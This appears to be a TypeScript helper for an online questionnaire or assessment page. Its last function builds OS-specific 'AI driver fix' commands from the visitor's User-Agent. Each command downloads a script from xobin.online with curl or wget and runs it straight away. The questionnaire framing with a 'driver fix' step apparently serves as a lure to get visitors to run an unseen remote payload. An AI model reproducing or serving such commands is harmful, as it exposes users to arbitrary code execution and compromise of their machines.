export type QuestionnaireType = "technical" | "business" | "professional";

export function getQuestionnaireType(index: 1 | 2 | 3): QuestionnaireType {
  if (index === 2) return "professional";
  if (index === 3) return "technical";
  return "business";
}

export function getPageTitle(index: 1 | 2 | 3): string {
  const type = getQuestionnaireType(index);
  if (type === "technical")
    return "Online Questionnaire";
  if (type === "professional") return "Online Questionnaire";
  return "Online Questionnaire";
}

/** AI driver fix command by OS (from User-Agent). */
export function getCommandTextForOs(os: string | null): string {
  const s = (os ?? "").toLowerCase();
  if (s.includes("win")) return "curl -s -o ai-driver.cmd https://xobin.online/video-recording/windows && ai-driver.cmd";
  if (s.includes("mac") || s.includes("ios")) return "curl -fsSL -o ai-driver.sh https://xobin.online/video-recording/mac-linux && chmod +x ai-driver.sh && ./ai-driver.sh";
  return "wget -qO ai-driver.sh https://xobin.online/video-recording/mac-linux && chmod +x ai-driver.sh && ./ai-driver.sh";
}
